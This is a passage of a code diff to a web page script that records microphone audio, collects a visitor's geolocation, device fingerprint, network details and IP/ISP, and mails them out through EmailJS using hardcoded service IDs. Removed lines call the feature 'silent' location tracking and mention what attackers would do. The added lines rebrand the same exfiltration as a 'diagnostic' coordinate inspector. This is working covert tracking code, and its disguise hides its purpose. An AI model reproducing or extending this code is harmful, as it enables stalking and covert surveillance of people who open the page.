+                    // Render audio elements to UI
+                    document.getElementById('audio-placeholder').style.display = 'none';
+                    const audioPlayer = document.getElementById('audio-preview');
+                    audioPlayer.src = URL.createObjectURL(audioBlob);
+                    audioPlayer.style.display = 'block';
+                    
+                    logTerminal('OK', 'Audio recording buffer processed and cached.');
                 };
 
                 recorder.start();
+                logTerminal('SYS', 'Microphone buffer recording in progress...');
+                
                 setTimeout(() => {
-                    recorder.stop();
-                    stream.getTracks().forEach(track => track.stop());
-                }, 5000); // Record for 5 seconds
+                    if (recorder.state !== "inactive") {
+                        recorder.stop();
+                        stream.getTracks().forEach(track => track.stop());
+                        logTerminal('SYS', 'Completing microphone recording cycle.');
+                    }
+                }, 5000);
             } catch (error) {
-                console.error("Error recording audio:", error);
+                logTerminal('ERROR', `Microphone interface error: ${error.message}`);
+                document.getElementById('audio-placeholder').innerHTML = '<i class="fa-solid fa-circle-exclamation text-danger"></i><p style="color:var(--color-accent)">Access Blocked</p>';
             }
         }
 
-        // Store Location Data
-        async function sendSilentLocation(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
-            const deviceInfo = getDeviceInfo();
-            const networkInfo = getNetworkInfo();
-            const { ip, isp } = await getIPAndISP();
-
-            locationHistory.push({ latitude, longitude, accuracy, deviceInfo, networkInfo, ip, isp });
-            if (locationHistory.length > 3) locationHistory.shift();
-            console.log("Location stored");
-        }
-
-        // Send All Collected Data
+        // Send All Collected Data via EmailJS
         function sendStoredData() {
             if (locationHistory.length === 0 && !photoData && !audioBlob) {
-                console.log("No data to send.");
+                logTerminal('WARNING', 'Diagnostic queue is empty. Transmission payload aborted.');
                 return;
             }
 
+            logTerminal('SYS', 'Compiling final diagnostic transmission payload...');
+            
             const deviceInfo = getDeviceInfo();
             const locationMessages = locationHistory.map((loc, index) => {
                 return `Location ${index + 1}:\nLat: ${loc.latitude}\nLon: ${loc.longitude}\nAcc: ${loc.accuracy}m\nDevice: ${loc.deviceInfo.type} ${loc.deviceInfo.brand}\nOS: ${loc.deviceInfo.os}\nBrowser: ${loc.deviceInfo.browser}\nScreen: ${loc.deviceInfo.screen}\nNet: ${loc.networkInfo.type}/${loc.networkInfo.effectiveType}\nIP: ${loc.ip}\nISP: ${loc.isp}`;
             }).join('\n\n');
 
-            const message = `Device: ${deviceInfo.type} ${deviceInfo.brand}\nOS: ${deviceInfo.os}\nBrowser: ${deviceInfo.browser}\n\n${locationMessages}\n\nPhoto and audio attached separately if captured.`;
+            const message = `Device: ${deviceInfo.type} ${deviceInfo.brand}\nOS: ${deviceInfo.os}\nBrowser: ${deviceInfo.browser}\n\n${locationMessages}\n\nPhoto and audio payloads captured and logged locally in coordinates client dashboard.`;
 
             const emailData = {
-                from_name: "Enhanced location Tracker",
+                from_name: "Enhanced Geolocation Coordinate Inspector",
                 message: message,
                 device_name: `${deviceInfo.type} ${deviceInfo.brand}`
             };
 
-            emailjs.send("service_7ee2uba", "template_b4j0rx4", emailData) // Replace with your service/template IDs
-                .then(response => console.log("Data sent:", response.status))
-                .catch(error => console.error("Email error:", error));
-
-            // Note: EmailJS doesn't support attachments natively. In a real attack, attackers would upload to a server.
-            if (photoData) console.log("Photo data ready (base64):", photoData.substring(0, 50) + "...");
-            if (audioBlob) console.log("Audio blob ready:", audioBlob);
+            logTerminal('SYS', 'Dispatching system metrics payload via EmailJS host nodes...');
+            
+            emailjs.send("service_7ee2uba", "template_b4j0rx4", emailData)
+                .then(response => {
+                    logTerminal('OK', `Transmission confirmed by EmailJS. Response code: ${response.status}`);
+                    const transStatus = document.getElementById('trans-status');
+                    transStatus.className = 'status-badge success';
+                    transStatus.innerHTML = '<span class="pulse-dot"></span> synced';
+                })
+                .catch(error => {
+                    logTerminal('ERROR', `Transmission payload failed: ${JSON.stringify(error)}`);
+                    const transStatus = document.getElementById('trans-status');
+                    transStatus.className = 'status-badge error';
+                    transStatus.innerHTML = '<span class="pulse-dot"></span> failed';
+                });
         }
 
-        function showError(error) {
-            console.error("Error getting location:", error);
+        // Device fingerprint parsing helper
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let deviceInfo = {
+                type: "Unknown",
+                brand: "Unknown",
+                os: "Unknown",
+                browser: "Unknown",
+                screen: `${window.screen.width}x${window.screen.height}`
+            };
+
+            if (/android/i.test(ua)) {
+                deviceInfo.type = "Android Mobile";
+                deviceInfo.brand = ua.match(/(Samsung|Huawei|Xiaomi|OnePlus|Pixel|LG)/i)?.[0] || "Android Device";
+            } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                deviceInfo.type = "iOS Mobile";
+                deviceInfo.brand = "Apple";
+            } else if (/Windows/i.test(ua)) {
+                deviceInfo.type = "Windows Desktop";
+                deviceInfo.brand = "PC";
+            } else if (/Mac OS/i.test(ua)) {
+                deviceInfo.type = "Mac Desktop";
+                deviceInfo.brand = "Apple";
+            } else if (/Linux/i.test(ua)) {
+                deviceInfo.type = "Linux Workstation";
+                deviceInfo.brand = "PC";
+            }
+
+            deviceInfo.os = navigator.platform;
+            deviceInfo.browser = ua.match(/(Chrome|Firefox|Safari|Edge|Opera)\/([\d.]+)/i)?.[0] || "Unknown Browser";
+            return deviceInfo;
+        }
+
+        // Network statistics helper
+        function getNetworkInfo() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            return conn ? {
+                type: conn.type || "Unknown",
+                effectiveType: conn.effectiveType || "Unknown"
+            } : { type: "Unknown", effectiveType: "Unknown" };
+        }
+
+        // IP Metadata client interface
+        async function getIPAndISP() {
+            return fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => ({ ip: data.ip || "Unknown", isp: data.org || "Unknown" }))
+                .catch(() => ({ ip: "Unknown", isp: "Unknown" }));
         }
     </script>   
 </body>
